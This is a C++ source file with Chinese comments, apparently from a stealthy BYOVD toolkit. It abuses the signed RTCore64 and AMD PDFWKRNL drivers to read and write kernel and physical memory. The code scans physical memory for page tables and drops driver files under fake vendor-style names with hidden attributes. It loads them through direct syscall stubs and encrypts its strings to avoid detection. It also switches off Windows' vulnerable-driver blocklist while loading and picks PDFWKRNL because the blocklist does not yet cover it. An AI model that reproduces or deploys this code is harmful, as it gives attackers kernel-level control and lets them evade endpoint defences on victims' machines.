//   探测 IOCTL 0x80002048/0x4C/0x30/0x34 哪个能成功读取物理内存
//   - 每次探测间 Sleep(50ms) 防止资源耗尽
//   - 最多 8 次探测, 立即 abort 资源耗尽 (err=1450)
// ★ v3.113: 改用 SAFE_TEST_PHYS (0x100000) 代替 0xFFFFF800... 虚拟地址
//   驱动 IOCTL 期望物理地址, 传入非法物理地址导致 MmMapIoSpace 蓝屏
static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
    int totalProbes = 0;
    const int MAX_PROBES = 8;
    (void)outTestVA; // 未使用, 保留兼容

    uint8_t testBuf[0x1000] = {};

    for (int ci = 0; ci < g_ioctlCandidateCount && totalProbes < MAX_PROBES; ci++) {
        uint32_t ioctl = g_ioctlCandidates[ci];
        if (ioctl == 0x80002040 || ioctl == 0x80002044 || ioctl == 0x80002050 || ioctl == 0x80002054) {
            continue;
        }

        totalProbes++;

        // ★ v3.115: 使用 PhysicalReadViaIOCTL 验证物理内存读取
        memset(testBuf, 0, sizeof(testBuf));
        bool ok = PhysicalReadViaIOCTL(hDevice, ioctl, SAFE_TEST_PHYS, testBuf, 4);
        DWORD err = GetLastError();
        uint32_t readVal = *(uint32_t*)testBuf;

        ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u phys=0x%llX val=0x%08X probe=%d/%d\n",
                  ioctl, (int)ok, err, (unsigned long long)SAFE_TEST_PHYS, readVal, totalProbes, MAX_PROBES);

        if (ok && readVal != 0 && readVal != 0xFFFFFFFF) {
            g_probedReadIoctl = ioctl;
            g_probedWriteIoctl = ioctl + 4;
            // ★ v3.122: 同步更新 g_probedIoctlFormat — PhysicalReadViaIOCTL 使用 48 字节格式
            //   (addr@+0x08, sizeType@+0x18), 对应 FMT_48B_PA_AT_08
            g_probedIoctlFormat = RTCore64Format::FMT_48B_PA_AT_08;
            ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X fmt=%d (val=0x%08X)\n",
                      g_probedReadIoctl, g_probedWriteIoctl, (int)g_probedIoctlFormat, readVal);
            return ioctl;
        }

        // 立即 abort 资源耗尽
        if (err == 1450) {
            ByovdDiag("BYOVD:ProbeIOCTL: ERROR_NO_SYSTEM_RESOURCES, aborting\n");
            break;
        }

        Sleep(50);
    }
    return 0; // 全部失败
}

// 轻量物理读取: 直接 IOCTL, 无日志/缓存/overlap 检查
// ★ v3.115: 使用 PhysicalReadViaIOCTL 读取物理内存, 不再错误使用虚拟内存 IOCTL
static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
                           uint64_t physAddr, uint8_t* outBuf4K) {
    if (!outBuf4K) return false;
    // ★ v3.115: 使用物理内存 IOCTL (0x80002048) 读取物理地址
    return PhysicalReadViaIOCTL(hDevice, ioctlCode, physAddr, outBuf4K, 0x1000);
}

// 检查一个物理页是否为当前进程的 PML4 表
static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
                        uint64_t physAddr, uint64_t* pml4Entries) {
    // ★ v3.104: 直接读取物理页到 pml4Entries 缓冲区
    if (!MapPhysicalRaw(hDevice, ioctlCode, physAddr, (uint8_t*)pml4Entries))
        return false;

    uint64_t* entries = pml4Entries;

    // 验证: 内核半区 (entry 256-511) 需要大部分 Present
    int kernelPresent = 0;
    for (int i = 256; i < 512; i++) {
        if (entries[i] & 1) kernelPresent++;
    }
    if (kernelPresent < 200) return false; // 至少 200 个内核条目

    // 验证: 抽查一个内核 PDPT — entry 0x1F0~0x1FF 是高内核地址区域
    for (int i = 490; i < 512; i++) {
        if (!(entries[i] & 1)) continue;
        uint64_t pdptPhys = entries[i] & 0x0000FFFFFFFFF000ULL;

        // ★ v3.122: 验证 pdptPhys 有效性 — 防止无效地址导致 MmMapIoSpace BSOD
        //   PML4E 的 Present 位为 1 不代表物理地址一定有效,
        //   过滤掉 0x0、BIOS 区域 (<0x1000)、以及过高的地址 (>4GB)
        if (pdptPhys == 0 || pdptPhys < 0x1000 || pdptPhys >= 0x100000000ULL)
            continue;

        uint8_t pdptBuf[0x1000];
        if (!MapPhysicalRaw(hDevice, ioctlCode, pdptPhys, pdptBuf))
            continue;

        // 读取 PDPT, 检查其内核半区是否也有 Present 条目
        uint64_t* pdptEntries = (uint64_t*)pdptBuf;

        int pdptKernel = 0;
        for (int j = 256; j < 512; j++) {
            if (pdptEntries[j] & 1) pdptKernel++;
        }
        if (pdptKernel > 100) return true; // 有效 PDPT → 确认为 PML4
    }
    return false;
}

// 通过 IOCTL 扫描物理内存寻找 PML4 表物理地址
static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
    // ★ v3.85: 先验证 IOCTL 是否真的可用 (避免在僵尸驱动上白扫描)
    {
        uint8_t testBuf[0x1000];
        bool testOk = MapPhysicalRaw(hDevice, ioctlCode, SAFE_TEST_PHYS, testBuf);
        ByovdDiag("BYOVD:FindPML4: IOCTL test phys=0x%llX ok=%d\n",
                  (unsigned long long)SAFE_TEST_PHYS, (int)testOk);
        if (!testOk) {
            ByovdDiag("BYOVD:FindPML4: IOCTL FAILED — driver zombie?\n");
            return 0; // IOCTL 不可用, 无需扫描
        }
    }

    // PML4 通常在低物理地址 (非分页池)
    // ★ v3.101: 从 1MB 开始扫描, 避开 0-1MB 的 BIOS 危险区域
    uint64_t pml4Entries[512]; // 栈上缓冲区
    const uint64_t SCAN_START  = SAFE_TEST_PHYS; // 1MB
    const uint64_t SCAN_LIMIT  = 0x8000000;       // 128 MB

    for (uint64_t phys = SCAN_START; phys < SCAN_LIMIT; phys += 0x1000) {
        // 每 4MB (1024 页) 输出进度
        if ((phys & 0x3FFFFF) == 0) {
            ByovdDiag("BYOVD:FindPML4: scanning @ phys=0x%llX / 0x%llX...\n",
                      (unsigned long long)phys, (unsigned long long)SCAN_LIMIT);
        }

        if (IsValidPML4(hDevice, ioctlCode, phys, pml4Entries)) {
            ByovdDiag("BYOVD:FindPML4: FOUND at phys=0x%llX (scanned %llu pages)\n",
                      (unsigned long long)phys, (unsigned long long)(phys >> 12));
            return phys;
        }
    }

    ByovdDiag("BYOVD:FindPML4: NOT FOUND in 128MB scan range\n");
    return 0;
}

// 获取 PML4 物理地址 (懒初始化 + 缓存)
// ★ 不能是 static: byovd_kernel.h 需要 friend 声明
// ★ v3.115: 使用 IOCTL_PHYSICAL_READ (0x80002048) 扫描物理内存, 不再使用虚拟内存 IOCTL
uint64_t ReadCR3() {
    static uint64_t s_cachedPML4 = 0;
    if (s_cachedPML4) return s_cachedPML4;

    auto& kma = KernelMemoryAccessor::Instance();
    // 注意: 此时 m_active=true, m_hDevice 有效 (Initialize 中调用)

    // ★ v3.115: 使用 IOCTL_PHYSICAL_READ (0x80002048) 扫描物理内存寻找 PML4
    s_cachedPML4 = FindPML4Physical(kma.m_hDevice, IOCTL_PHYSICAL_READ);

    ByovdDiag("BYOVD:ReadCR3: PML4 phys=0x%llX\n",
              (unsigned long long)s_cachedPML4);
    return s_cachedPML4;
}

// ============================================================
// 页表遍历: 虚拟地址 → 物理地址
//
// x64 分页结构:
//   [47:39] PML4 索引 (9 bits)    → PML4E
//   [38:30] PDPT 索引 (9 bits)    → PDPTE
//   [29:21] PD   索引 (9 bits)    → PDE
//   [20:12] PT   索引 (9 bits)    → PTE  (4KB 页; 2MB 大页跳过此层)
//   [11:0]  页内偏移  (12 bits)   → 最终地址
//
// 使用 __readcr3() 获取当前进程 CR3, 
// 内核空间页表跨所有进程共享, 因此可翻译任意内核地址
// ============================================================
class PageTableWalker {
public:
    PageTableWalker(uint64_t cr3, KernelMemoryAccessor& kma)
        : m_cr3(cr3 & ~0xFFF), m_kma(kma) {}

    // 将内核虚拟地址转换为物理地址
    // 返回 0 表示页不存在或转换失败
    uint64_t VaToPa(uint64_t va) {
        uint64_t pml4_idx = (va >> 39) & 0x1FF;
        uint64_t pdpt_idx = (va >> 30) & 0x1FF;
        uint64_t pd_idx   = (va >> 21) & 0x1FF;
        uint64_t pt_idx   = (va >> 12) & 0x1FF;
        uint64_t offset   = va & 0xFFF;

        // Level 1: PML4
        uint64_t pml4e = ReadPhysQword(m_cr3 + pml4_idx * 8);
        if (!(pml4e & 1)) return 0;                    // Present
        uint64_t pdpt_pa = PFN_TO_PA(pml4e);

        // Level 2: PDPT
        uint64_t pdpte = ReadPhysQword(pdpt_pa + pdpt_idx * 8);
        if (!(pdpte & 1)) return 0;
        uint64_t pd_pa = PFN_TO_PA(pdpte);

        // Level 3: Page Directory
        uint64_t pde = ReadPhysQword(pd_pa + pd_idx * 8);
        if (!(pde & 1)) return 0;

        // 检查 2MB 大页 (PS bit = bit 7)
        if (pde & (1ULL << 7)) {
            return PFN_TO_PA_LARGE(pde) + (va & ((1ULL << 21) - 1));
        }

        // Level 4: Page Table
        uint64_t pte = ReadPhysQword(PFN_TO_PA(pde) + pt_idx * 8);
        if (!(pte & 1)) return 0;

        return PFN_TO_PA(pte) + offset;
    }

private:
    // PFN → 物理地址 (清除低12位标志 + NX位)
    static uint64_t PFN_TO_PA(uint64_t entry) {
        return (entry & 0x0000FFFFFFFFF000ULL) & ~(1ULL << 63);  // 清除 NX
    }

    static uint64_t PFN_TO_PA_LARGE(uint64_t entry) {
        return (entry & 0x0000FFFFFFE00000ULL) & ~(1ULL << 63);
    }

    // 通过 RTCore64 物理内存映射读取 8 字节
    uint64_t ReadPhysQword(uint64_t physicalAddr) {
        uint64_t value = 0;
        m_kma.ReadPhysical(physicalAddr, &value, sizeof(value));
        return value;
    }

    uint64_t m_cr3;
    KernelMemoryAccessor& m_kma;
};

// ============================================================
// BYOVD 驱动定义
// ============================================================

// (IOCTL 常量定义已移至文件顶部 VirtualReadViaIOCTL 之前)

// ★ BUILD 550: BYOVDDriverInfo 改为运行时解密填充 — 避免明文驱动名/服务名/设备路径出现在 .rdata
//   原实现: const BYOVDDriverInfo RTCore64 = { L"RTCore64Svc", ... } → 明文残留
//   新实现: MakeXxxDriver() 函数内使用 STEALTH_WSTR_DECRYPT_TO 解密到栈缓冲, 再 wcscpy_s 到结构体
static BYOVDDriverInfo MakeRTCore64Driver() {
    BYOVDDriverInfo info = {};
    STEALTH_WSTR_DECRYPT_TO("RTCore64Svc", info.serviceName, 128);
    STEALTH_WSTR_DECRYPT_TO("RTCore64 Micro-Star Driver", info.displayName, 128);
    STEALTH_WSTR_DECRYPT_TO("\\\\.\\RTCore64", info.devicePath, 128);
    STEALTH_WSTR_DECRYPT_TO("RTCore64.sys", info.driverPath, 260);
    info.ioctlCode = IOCTL_VIRTUAL_MEM;  // ★ v3.114: 使用虚拟内存 IOCTL (0x80002000)
    info.needsMemoryMap = true;
    return info;
}

const BYOVDDriverInfo BYOVDDrivers::RTCore64 = MakeRTCore64Driver();

// ★ BUILD 489: PDFWKRNL.sys — AMD PDF Worker 内核驱动
//   IOCTL 0x80002014: kernel VA memcpy R/W (METHOD_BUFFERED, 无安全检查)
//   优势: 2026年未被 Microsoft 漏洞驱动阻止列表拦截
//   设备: \Device\PdfwKrnl → \\.\PdfwKrnl
static BYOVDDriverInfo MakePdfwKrnlDriver() {
    BYOVDDriverInfo info = {};
    STEALTH_WSTR_DECRYPT_TO("PdfwKrnlSvc", info.serviceName, 128);
    STEALTH_WSTR_DECRYPT_TO("AMD PDF Worker Kernel Driver", info.displayName, 128);
    STEALTH_WSTR_DECRYPT_TO("\\\\.\\PdfwKrnl", info.devicePath, 128);
    STEALTH_WSTR_DECRYPT_TO("PDFWKRNL.sys", info.driverPath, 260);
    info.ioctlCode = IOCTL_AMDPDFW_MEMCPY;  // 0x80002014
    info.needsMemoryMap = false;
    return info;
}

const BYOVDDriverInfo BYOVDDrivers::PDFWKRNL = MakePdfwKrnlDriver();

// ★ BUILD 490: 仅 PDFWKRNL — 安全性更高:
//   1. 未被 Microsoft 漏洞驱动阻止列表拦截 (RTCore64 已被拦截)
//   2. METHOD_BUFFERED IOCTL, 无物理内存映射风险
//   3. AMD 官方驱动, 签名可信度高, 隐蔽性更好
//   4. 简单 memcpy 原语, 不涉及 MmMapIoSpace 等高风险操作
static const BYOVDDriverInfo* g_driverCandidates[] = {
    &BYOVDDrivers::PDFWKRNL,
};

const BYOVDDriverInfo* BYOVDDrivers::GetAllCandidates() {
    return g_driverCandidates[0];
}

int BYOVDDrivers::GetCandidateCount() {
    return sizeof(g_driverCandidates) / sizeof(g_driverCandidates[0]);
}

// ============================================================
// KernelMemoryAccessor 实现
// ============================================================

KernelMemoryAccessor& KernelMemoryAccessor::Instance() {
    static KernelMemoryAccessor inst;
    return inst;
}

bool KernelMemoryAccessor::IsHVCIEnabled() {
    // 方法1: 注册表检测
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD hvci = 0, size = sizeof(DWORD);
        RegQueryValueExW(hKey, L"HypervisorEnforcedCodeIntegrity",
            nullptr, nullptr, (LPBYTE)&hvci, &size);
        RegCloseKey(hKey);
        if (hvci != 0) return true;
    }

    // 方法2: SystemCodeIntegrityInformation (0x67) 
    // 通过 NtQuerySystemInformation
    HMODULE ntdll = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll"));
    if (ntdll) {
        using NtQuerySystemInfo_t = LONG(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
        auto pNtQsi = (NtQuerySystemInfo_t)STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQuerySystemInformation");
        if (pNtQsi) {
            struct { ULONG length; ULONG flags; } ci = {};
            ULONG retLen = 0;
            pNtQsi(0x67, &ci, sizeof(ci), &retLen);
            if (ci.flags & 0x01) return true; // CODEINTEGRITY_OPTION_ENABLED
        }
    }

    return false;
}

// ============================================================
// 确保 BYOVD 驱动文件存在 (嵌入式提取回退)
//
// ★ BUILD 496: 返回 const wchar_t* (静态缓冲区), 替代 std::wstring
//   优先级:
//   0. 给定路径直接存在 (MutateAndRandomizeDriver 已写入 %TEMP%)
//   1. System32\drivers\<name> (系统已安装)
//   2. %TEMP%\<name> (从嵌入字节提取)
// ============================================================
static const wchar_t* EnsureDriverFile(const wchar_t* driverName) {
    static wchar_t s_resultPath[MAX_PATH]; // 线程不安全, 但本模块单线程
    s_resultPath[0] = 0;

    // ★ v3.126q: 确保随机种子在此函数首次调用前已初始化
    static bool srandSeeded = false;
    if (!srandSeeded) { srand(GetTickCount() ^ __rdtsc()); srandSeeded = true; }

    // ★ v3.97: 0. 先检查给定路径是否直接存在
    if (GetFileAttributesW(driverName) != INVALID_FILE_ATTRIBUTES) {
        ByovdDiag("BYOVD:EnsureDriverFile: file exists at given path '%ls'\n", driverName);
        wcscpy_s(s_resultPath, driverName);
        return s_resultPath;
    }

    wchar_t sysPath[MAX_PATH];

    // 1. 检查 System32\drivers
    GetSystemDirectoryW(sysPath, MAX_PATH);
    wcscat_s(sysPath, L"\\drivers\\");
    wcscat_s(sysPath, driverName);

    if (GetFileAttributesW(sysPath) != INVALID_FILE_ATTRIBUTES) {
        wcscpy_s(s_resultPath, sysPath);
        return s_resultPath;
    }

    // 2. 从嵌入字节提取到 %TEMP%
    {
        const uint8_t* embedData = nullptr;
        size_t embedSize = 0;

        const wchar_t* baseName = driverName;
        const wchar_t* lastSlash = wcsrchr(baseName, L'\\');
        if (lastSlash) baseName = lastSlash + 1;

        // ★ BUILD 550: RTCore64.sys 嵌入匹配已移除 (死代码, g_driverCandidates[] 仅 PDFWKRNL)
        //   PDFWKRNL.sys 的嵌入提取由 MutateAndRandomizeDriver() 负责, 此函数仅处理文件系统路径
        ByovdDiag("BYOVD:EnsureDriverFile: driverName '%ls' (no embed match)\n", driverName);

        if (embedData && embedSize > 0) {
            static const wchar_t* randomPrefixes[] = {
                L"amdx", L"nvld", L"igfx", L"athw",
                L"rtwl", L"btw", L"iwl", L"netw",
                L"e2f", L"rtl", L"vmci", L"vhd",
                L"wd", L"usb", L"acpi", L"pci",
                L"hda", L"intel", L"amd", L"nvidia",
            };
            for (int retry = 0; retry < 5; retry++) {
                wchar_t tryPath[MAX_PATH];
                GetTempPathW(MAX_PATH, tryPath);
                const wchar_t* prefix = randomPrefixes[rand() % 20];
                wchar_t altName[64];
                swprintf_s(altName, L"%ls_%04X.sys", prefix, (rand() & 0xFFFF));
                wcscat_s(tryPath, altName);

                DeleteFileW(tryPath);
                HANDLE hFile = CreateFileW(tryPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE,
                                           nullptr, CREATE_ALWAYS,
                                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED,
                                           nullptr);
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD written;
                    WriteFile(hFile, embedData, (DWORD)embedSize, &written, nullptr);
                    FlushFileBuffers(hFile);
                    CloseHandle(hFile);
                    ByovdDiag("BYOVD:EnsureDriverFile: wrote %u/%zu to %ls (retry=%d)\n", written, embedSize, tryPath, retry);
                    wcscpy_s(s_resultPath, tryPath);
                    return s_resultPath;
                }
                ByovdDiag("BYOVD:EnsureDriverFile: CreateFileW FAILED for %ls (err=%u, retry=%d)\n", tryPath, GetLastError(), retry);
            }
        } else {
            ByovdDiag("BYOVD:EnsureDriverFile: embedData=0x%p or embedSize=%zu — skipping\n", embedData, embedSize);
        }
    }

    return nullptr;
}

// ★ v3.75: 强制停止并删除所有残留 RTCore64 服务
//   解决 STATUS_OBJECT_NAME_COLLISION (0xC0000035):
//   之前异常的进程退出导致 \Driver\RTCore64 内核对象未清理,
//   导致再次加载时 NtLoadDriver 返回重名冲突
//   通过 SCM ControlService(SERVICE_CONTROL_STOP) 触发 DriverUnload,
//   然后 NtUnloadDriver + DeleteService 彻底清理
static void ForceRemoveRTCore64Services() {
    // ★ BUILD 474: 替换 SCM 为纯注册表清理 — OpenSCManagerW 在手动映射 DLL 中崩溃
    HKEY hServices;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services", 0,
        KEY_ENUMERATE_SUB_KEYS | DELETE, &hServices) != ERROR_SUCCESS)
        return;

    DWORD idx = 0;
    while (idx < 512) {
        wchar_t name[256];
        DWORD nameLen = 256;
        if (RegEnumKeyExW(hServices, idx, name, &nameLen,
            nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
            break;
        // ★ BUILD 550: 解密敏感服务名前缀 (原 L"RTCore64"/L"SysMon"/L"PdfwKrnl" 明文)
        wchar_t wRTCore[32], wSysMon[32], wPdfw[32];
        STEALTH_WSTR_DECRYPT_TO("RTCore64", wRTCore, 32);
        STEALTH_WSTR_DECRYPT_TO("SysMon", wSysMon, 32);
        STEALTH_WSTR_DECRYPT_TO("PdfwKrnl", wPdfw, 32);
        bool isOurs = (wcsstr(name, wRTCore) == name)
                   || (wcsstr(name, wSysMon) == name)
                   || (wcsstr(name, wPdfw) == name);  // ★ BUILD 489
        if (isOurs) {
            ByovdDiag("BYOVD:ForceRemove: deleting stale service '%ls' (registry only, BUILD 474)\n", name);
            RegDeleteTreeW(hServices, name);
            // 不idx++ — 删除后索引变化
        } else {
            idx++;
        }
    }
    RegCloseKey(hServices);
}

// ★ BUILD 485: 缓存的 Nt* SSN — 在 Initialize 初期提取, LoadDriver 直接使用
//   避免 manual-mapped DLL 上下文中的 CFG 崩溃
static DWORD g_cachedSsnCreateKey   = 0;
static DWORD g_cachedSsnOpenKey     = 0;
static DWORD g_cachedSsnSetValueKey = 0;
static DWORD g_cachedSsnLoadDriver  = 0;
// ★ BUILD 490: EnablePrivilege 直接 syscall 所需 SSN
static DWORD g_cachedSsnOpenProcessToken      = 0;
static DWORD g_cachedSsnAdjustPrivilegesToken = 0;

bool KernelMemoryAccessor::LoadDriver(const wchar_t* serviceName,
                                       const wchar_t* driverPath) {
    // ★ BUILD 485: Win11 CFG 阻止 manual-mapped DLL 调用 advapi32→ntdll 包装.
    //   全部替换为 Nt* 直接 syscall stubs. SSN 已在 Initialize 中缓存.
    ByovdDiag("B550:LD:ENTER drv-stubs\n");  // ★ BUILD 550: 脱敏 (原含驱动名)

    // 使用缓存的 SSN
    if (!g_cachedSsnCreateKey || !g_cachedSsnOpenKey ||
        !g_cachedSsnSetValueKey || !g_cachedSsnLoadDriver) {
        ByovdDiag("BYOVD:LoadDriver: cached SSN INVALID\n");
        return false;
    }

    // 生成 syscall stubs
    void* stCK = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnCreateKey);
    void* stOK = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnOpenKey);
    void* stSV = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnSetValueKey);
    void* stLD = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnLoadDriver);
    if (!stCK || !stOK || !stSV || !stLD) {
        if(stCK)VirtualFree(stCK,0,MEM_RELEASE); if(stOK)VirtualFree(stOK,0,MEM_RELEASE);
        if(stSV)VirtualFree(stSV,0,MEM_RELEASE); if(stLD)VirtualFree(stLD,0,MEM_RELEASE);
        return false;
    }

    using FnCK = NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,ULONG,PUNICODE_STRING,ULONG,PULONG);
    using FnOK = NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES);
    using FnSV = NTSTATUS(NTAPI*)(HANDLE,PUNICODE_STRING,ULONG,ULONG,PVOID,ULONG);
    using FnLD = NTSTATUS(NTAPI*)(PUNICODE_STRING);

    // 准备 NT 路径
    wchar_t fullPath[MAX_PATH];
    // ★ BUILD 496: driverPath 现在是 const wchar_t*, 使用 wcschr 替代 std::wstring::find
    if (!wcschr(driverPath, L'\\')) {
        GetSystemDirectoryW(fullPath, MAX_PATH);
        wcscat_s(fullPath, L"\\drivers\\");
        wcscat_s(fullPath, driverPath);
    } else {
        wcscpy_s(fullPath, driverPath);
    }
    wchar_t ntPath[MAX_PATH*2];
    if(fullPath[0]!=L'\\'||fullPath[1]!=L'\\')swprintf_s(ntPath,L"\\??\\%ls",fullPath);
    else wcscpy_s(ntPath,fullPath);

    // ★ BUILD 496: 手动构造注册表路径, 替代 std::wstring 拼接
    wchar_t knpBuf[512];
    swprintf_s(knpBuf, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%ls", serviceName);
    UNICODE_STRING kus; kus.Buffer=knpBuf; kus.Length=(USHORT)(wcslen(knpBuf)*2);
    kus.MaximumLength=kus.Length+2;
    OBJECT_ATTRIBUTES oa={}; InitializeObjectAttributes(&oa,&kus,OBJ_CASE_INSENSITIVE,nullptr,nullptr);

    HANDLE hKey=nullptr; ULONG disp=0; NTSTATUS st;
    st=reinterpret_cast<FnCK>(stCK)(&hKey,KEY_ALL_ACCESS,&oa,0,nullptr,REG_OPTION_NON_VOLATILE,&disp);
    ByovdDiag("BYOVD:LoadDriver: NtCreateKey → 0x%08X (hKey=0x%llX disp=%u)\n", (uint32_t)st, (uint64_t)hKey, disp);
    if(!NT_SUCCESS(st)){
        st=reinterpret_cast<FnOK>(stOK)(&hKey,KEY_ALL_ACCESS,&oa);
        ByovdDiag("BYOVD:LoadDriver: NtOpenKey fallback → 0x%08X (hKey=0x%llX)\n", (uint32_t)st, (uint64_t)hKey);
        if(!NT_SUCCESS(st)){ByovdDiag("BYOVD:LoadDriver: key open FAILED 0x%08X\n",(uint32_t)st);goto done;}
    }

    // 设置注册表值 (NtSetValueKey) — 手动初始化 UNICODE_STRING, 不调 RtlInitUnicodeString
    {
        UNICODE_STRING vn; NTSTATUS sv;
        #define SET_DWORD(n,v,label) do{vn.Buffer=const_cast<wchar_t*>(n);vn.Length=(USHORT)(wcslen(n)*2);vn.MaximumLength=vn.Length+2;sv=reinterpret_cast<FnSV>(stSV)(hKey,&vn,0,REG_DWORD,&v,sizeof(v));ByovdDiag("BYOVD:LoadDriver: NtSetValueKey(%ls=%u) → 0x%08X\n",n,v,(uint32_t)sv);}while(0)
        DWORD t=1; SET_DWORD(L"Type",t,0); DWORD s=3; SET_DWORD(L"Start",s,0); DWORD e=1; SET_DWORD(L"ErrorControl",e,0);
        #undef SET_DWORD
        const wchar_t* ipn=L"ImagePath"; vn.Buffer=const_cast<wchar_t*>(ipn);
        vn.Length=(USHORT)(wcslen(ipn)*2); vn.MaximumLength=vn.Length+2;
        st=reinterpret_cast<FnSV>(stSV)(hKey,&vn,0,REG_EXPAND_SZ,(PVOID)ntPath,(ULONG)((wcslen(ntPath)+1)*2));
        ByovdDiag("BYOVD:LoadDriver: NtSetValueKey(ImagePath) → 0x%08X val=%ls\n", (uint32_t)st, ntPath);
    }

    // ★ BUILD 489: 临时禁用漏洞驱动阻止列表 (Win11 可能拦截 RTCore64.sys, PDFWKRNL 不受影响)
    //   CI\Config\VulnerableDriverBlocklistEnable = 0 → 加载 → 恢复 = 1
    {
        // ★ BUILD 496: 固定字符串替代 std::wstring
        const wchar_t* ciPathStr = L"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\CI\\Config";
        UNICODE_STRING ciUs; ciUs.Buffer = const_cast<wchar_t*>(ciPathStr);
        ciUs.Length = (USHORT)(wcslen(ciPathStr) * 2);
        ciUs.MaximumLength = ciUs.Length + 2;
        OBJECT_ATTRIBUTES ciOa = {}; InitializeObjectAttributes(&ciOa, &ciUs, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        HANDLE hCIKey = nullptr;
        NTSTATUS ciSt = reinterpret_cast<FnOK>(stOK)(&hCIKey, KEY_SET_VALUE, &ciOa);
        if (NT_SUCCESS(ciSt)) {
            // 保存原始值 (如果有的话), 设为 0
            DWORD disableVal = 0;
            UNICODE_STRING vnVuln; 
            const wchar_t* vnName = L"VulnerableDriverBlocklistEnable";
            vnVuln.Buffer = const_cast<wchar_t*>(vnName);
            vnVuln.Length = (USHORT)(wcslen(vnName) * 2);
            vnVuln.MaximumLength = vnVuln.Length + 2;
            NTSTATUS svSt = reinterpret_cast<FnSV>(stSV)(hCIKey, &vnVuln, 0, REG_DWORD, &disableVal, sizeof(disableVal));
            ByovdDiag("BYOVD:LoadDriver: disable blocklist → 0x%08X (set VDBE=0)\n", (uint32_t)svSt);
        } else {
            ByovdDiag("BYOVD:LoadDriver: cannot open CI\\Config (0x%08X) — blocklist bypass skipped\n", (uint32_t)ciSt);
        }

        // ★ BUILD 489: 启用 SeLoadDriverPrivilege — NtLoadDriver 必需此权限
        //   0xC0000061 (STATUS_PRIVILEGE_NOT_HELD) 表示 token 中缺少此权限
        EnablePrivilege(L"SeLoadDriverPrivilege");
        ByovdDiag("BYOVD:LoadDriver: EnablePrivilege(SeLoadDriverPrivilege) done\n");

        // 调用 NtLoadDriver
        // ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        wchar_t rp[512];
        swprintf_s(rp, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%ls", serviceName);
        UNICODE_STRING rus; rus.Buffer = rp; rus.Length = (USHORT)(wcslen(rp) * 2);
        rus.MaximumLength = rus.Length + 2;
        st = reinterpret_cast<FnLD>(stLD)(&rus);
        ByovdDiag("BYOVD:LoadDriver: NtLoadDriver(syscall) → 0x%08X\n", (uint32_t)st);

        // 恢复阻止列表
        if (hCIKey) {
            DWORD enableVal = 1;
            UNICODE_STRING vnVuln2;
            const wchar_t* vnName2 = L"VulnerableDriverBlocklistEnable";
            vnVuln2.Buffer = const_cast<wchar_t*>(vnName2);
            vnVuln2.Length = (USHORT)(wcslen(vnName2) * 2);
            vnVuln2.MaximumLength = vnVuln2.Length + 2;
            reinterpret_cast<FnSV>(stSV)(hCIKey, &vnVuln2, 0, REG_DWORD, &enableVal, sizeof(enableVal));
            NtClose(hCIKey);
        }
    }

done:
    VirtualFree(stCK,0,MEM_RELEASE); VirtualFree(stOK,0,MEM_RELEASE);
    VirtualFree(stSV,0,MEM_RELEASE); VirtualFree(stLD,0,MEM_RELEASE);
    return NT_SUCCESS(st)||st==0xC000010E;
}

bool KernelMemoryAccessor::UnloadDriver(const wchar_t* serviceName) {
    // ★ BUILD 474: 替换 NtUnloadDriver → RegDeleteTreeW
    //   manual-mapped DLL 上下文中 NtUnloadDriver = ACCESS_VIOLATION in ntdll
    //   只删除注册表键即可 (驱动代码未加载, 不存在卸载问题)
    HKEY hServices;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services", 0,
        KEY_ENUMERATE_SUB_KEYS | DELETE, &hServices) == ERROR_SUCCESS)
    {
        LONG result = RegDeleteTreeW(hServices, (LPWSTR)serviceName);
        RegCloseKey(hServices);
        ByovdDiag("BYOVD:UnloadDriver: %ls -> RegDeleteTree=%d (BUILD 474 skip NtUnloadDriver)\n",
            serviceName, (int)(result == ERROR_SUCCESS));
        return result == ERROR_SUCCESS;
    }
    return false;
}

bool KernelMemoryAccessor::EnablePrivilege(const wchar_t* privilegeName) {
    // ★ BUILD 490: Win11 CFG 阻止 manual-mapped DLL 调用 advapi32→ntdll,
    //   改用直接 syscall (NtOpenProcessToken + NtAdjustPrivilegesToken).
    //   SeLoadDriverPrivilege 的 LUID 是系统级常量 {10, 0}, 无需 LookupPrivilegeValueW.
    if (!g_cachedSsnOpenProcessToken || !g_cachedSsnAdjustPrivilegesToken) {
        ByovdDiag("BYOVD:EnablePrivilege: SSN not cached, cannot use syscall fallback\n");
        return false;
    }

    // 生成 syscall stubs
    void* stOPT = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnOpenProcessToken);
